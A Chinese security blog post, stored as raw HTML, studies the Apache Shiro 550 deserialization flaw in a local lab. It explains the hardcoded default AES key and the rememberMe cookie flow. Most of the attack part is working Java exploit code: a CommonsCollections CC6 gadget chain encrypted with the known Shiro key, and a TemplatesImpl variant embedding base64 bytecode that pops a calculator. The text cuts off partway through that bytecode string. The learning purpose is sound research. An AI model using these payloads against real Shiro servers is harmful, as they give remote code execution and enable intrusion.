@@ -1,0 +1,534 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/bg/6.png">
+  <link rel="icon" href="/img/bg/6.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="海马少年">
+  <meta name="keywords" content="">
+  <meta name="description" content="Shiro 550 反序列化漏洞前言前两天跟着P神的文章学习了部分CC链，看多少忘多少…………（实在是太菜了），之后先跟着学习边学边复习吧。今天轮到了 shiro 反序列化，刚好再比赛中遇到了，但是我直接是靠工具怼的，属实是太菜了，所以这里简单学习一下原理。 ShiroApache Shiro 是一个java框架，执行身份验证，授权，密码和会话管理。为了让浏览器或服务器重启之后用户不丢失登录状态，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro 550 反序列化(一)">
+<meta property="og:url" content="http://example.com/2021/11/16/Shiro-550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/index.html">
+<meta property="og:site_name" content="Lcdm123">
+<meta property="og:description" content="Shiro 550 反序列化漏洞前言前两天跟着P神的文章学习了部分CC链，看多少忘多少…………（实在是太菜了），之后先跟着学习边学边复习吧。今天轮到了 shiro 反序列化，刚好再比赛中遇到了，但是我直接是靠工具怼的，属实是太菜了，所以这里简单学习一下原理。 ShiroApache Shiro 是一个java框架，执行身份验证，授权，密码和会话管理。为了让浏览器或服务器重启之后用户不丢失登录状态，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211114230106404.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211114230507402.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211114230954499.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211115220713778.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211115220653539.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211115221233558.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211115223038870.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211115223132095.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211115222331941.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211115234747396.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211115235103394.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211115235253251.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211115234618480.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211116000340086.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211115222331941.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211116001116904.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211116001047051.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211116001835882.png">
+<meta property="article:published_time" content="2021-11-15T16:28:34.000Z">
+<meta property="article:modified_time" content="2021-11-16T10:06:48.851Z">
+<meta property="article:author" content="海马少年">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211114230106404.png">
+  
+  <title>Shiro 550 反序列化(一) - Lcdm123</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"*","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Lcdm123" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>海马少年</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg/6.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Shiro 550 反序列化(一)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-16 00:28" pubdate>
+        2021年11月16日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      16k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      49 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Shiro 550 反序列化(一)</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Shiro-550-反序列化漏洞"><a href="#Shiro-550-反序列化漏洞" class="headerlink" title="Shiro 550 反序列化漏洞"></a>Shiro 550 反序列化漏洞</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前两天跟着P神的文章学习了部分CC链，看多少忘多少…………（实在是太菜了），之后先跟着学习边学边复习吧。今天轮到了 shiro 反序列化，刚好再比赛中遇到了，但是我直接是靠工具怼的，属实是太菜了，所以这里简单学习一下原理。</p>
+<h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><p>Apache Shiro 是一个java框架，执行身份验证，授权，密码和会话管理。为了让浏览器或服务器重启之后用户不丢失登录状态，Shiro 支持将持久化信息序列化并加密后保存再 Cookie 的 rememberMe 字段中，下次读取时就行解密再反序列化。再 1.2.4版本之前内置了一个默认且固定的加密 key，导致了攻击者可以伪造任意的 rememberMe Cookie 触发反序列化漏洞。</p>
+<p>Shiro-550<code>(Apache  Shiro &lt; 1.2.5)</code><strong>和Shiro-721</strong><code>( Apache  Shiro &lt; 1.4.2 )</code><strong>。这两个漏洞主要区别在于Shiro550使用已知密钥撞，后者Shiro721是使用</strong><code>登录后rememberMe=&#123;value&#125;去爆破正确的key值</code>进而反序列化，对比Shiro550条件只要有<code>足够密钥库</code>（条件比较低）、Shiro721需要登录（要求比较高）。</p>
+<p>攻击流程：</p>
+<p><code>得到rememberMe的Cookie值 -&gt; Base64解码 -&gt; AES解密 -&gt; 反序列化</code></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接利用 IDEA 来搭建一个Tomcat环境并且运行起来，具体步骤可以直接去网上找</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211114230106404.png" srcset="/img/loading.gif" lazyload alt="image-20211114230106404"></p>
+<blockquote>
+<p>这里利用的是P神的 shiroDemo</p>
+</blockquote>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211114230507402.png" srcset="/img/loading.gif" lazyload alt="image-20211114230507402"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>中找到默认的密钥</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211114230954499.png" srcset="/img/loading.gif" lazyload alt="image-20211114230954499"></p>
+<p>payload的攻击流程就是<code>payload-&gt;AES加密-&gt;Base64加密</code></p>
+<blockquote>
+<p>先自己写一下CC6的链，然后再加密</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShiroCC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] fakeTransfomer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">1</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">1</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransfomer);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(inerMap,chainedTransformer);<br><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        HashMap&lt;TiedMapEntry,String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;lcdm&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        Field field = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(chainedTransformer,transformers);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br>		<span class="hljs-comment">// 对序列化的结果进行加密</span><br>        <span class="hljs-keyword">byte</span>[] payload = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        ByteSource ciphertxt = aes.encrypt(payload, key);<br>        System.out.println(ciphertxt.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>直接传过去会报错</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115220713778.png" srcset="/img/loading.gif" lazyload alt="image-20211115220713778"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115220653539.png" srcset="/img/loading.gif" lazyload alt="image-20211115220653539"></p>
+<p>看了一下P神的文章，这里的报错的是因为<code>Transformer</code>数组的问题</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115221233558.png" srcset="/img/loading.gif" lazyload alt="image-20211115221233558"></p>
+<p><strong>所以这里的问题就是要解决怎么样不使用数组来构造可利用链子？</strong></p>
+<p>如果使用<code>TemplatesImpl</code>加载字节码的话，也是会有两个元素的数组的。能不能减少呢？</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115223038870.png" srcset="/img/loading.gif" lazyload alt="image-20211115223038870"></p>
+<p>可以利用上面的<code>getValue()</code>方法调用到<code>LazyMap()</code>的<code>get()</code>方法，之后利用<code>this.factory.transform(key)</code>来执行到<code>transformer()</code>函数</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115223132095.png" srcset="/img/loading.gif" lazyload alt="image-20211115223132095"></p>
+<p>这里之前分析过，直接绕过<code>InvokerTransformer()</code>执行字节码</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115222331941.png" srcset="/img/loading.gif" lazyload alt="image-20211115222331941"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 最初的执行方法</span><br><span class="hljs-keyword">byte</span>[] code = <span class="hljs-string">&quot;&quot;</span>.getBytes();<br>TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>templates.newTransformer();<br><span class="hljs-comment">// CC3 中的执行方法</span><br><span class="hljs-keyword">byte</span>[] code = <span class="hljs-string">&quot;&quot;</span>.getBytes();<br>TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br><span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br><span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br><span class="hljs-comment">// 或者</span><br>Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br><span class="hljs-keyword">new</span> ConstantTransformer(templates),<br><span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>)<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>这里根据之前的payload看就可以直接把数组去掉然后直接构造</p>
+<p>先构造好字节码，作用就是弹出计算器</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115234747396.png" srcset="/img/loading.gif" lazyload alt="image-20211115234747396"></p>
+<p>第一种 POC：根据<code>templates.newTransformer();</code>来直接构造POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplShiroCC6Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, IOException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAEbWFpbgEAFihbTGphdmEv&quot;</span> +<br>                <span class="hljs-string">&quot;bGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRh&quot;</span> +<br>                <span class="hljs-string">&quot;YmxlAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zBwAqAQAGPGluaXQ+&quot;</span> +<br>                <span class="hljs-string">&quot;AQADKClWAQAEdGhpcwEAEkxvcmcvbGNkbTEyMy9FeGVjOwEACXRyYW5zZm9ybQEAcihMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +<br>                <span class="hljs-string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3Vt&quot;</span> +<br>                <span class="hljs-string">&quot;ZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +<br>                <span class="hljs-string">&quot;YWxpemF0aW9uSGFuZGxlcjsHACsBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5h&quot;</span> +<br>                <span class="hljs-string">&quot;bC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJ&quot;</span> +<br>                <span class="hljs-string">&quot;dGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1Nlcmlh&quot;</span> +<br>                <span class="hljs-string">&quot;bGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJj&quot;</span> +<br>                <span class="hljs-string">&quot;ZUZpbGUBAAlFeGVjLmphdmEBABBvcmcvbGNkbTEyMy9FeGVjDAARABIHACwMAC0ALgEAEGdub21l&quot;</span> +<br>                <span 